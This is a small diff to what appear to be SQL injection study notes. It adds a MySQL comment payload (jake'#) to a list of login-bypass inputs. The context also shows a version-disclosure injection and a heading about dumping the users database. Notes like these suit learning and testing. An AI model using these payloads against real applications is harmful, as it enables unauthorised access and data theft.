@@ -12,6 +12,7 @@ We can use an OR statement to make the sql query always true, so if the query br
 ```
 jake'--
 jake'-- -
+jake'#
 ```
 
 We can now just add mysql syntax after the 1=1 query.
@@ -21,7 +22,6 @@ We can now just add mysql syntax after the 1=1 query.
 ```
 jake' OR 1=1 in (select @@version) -- //
 ```
-
 ## Users database dump
 
 Dump all information
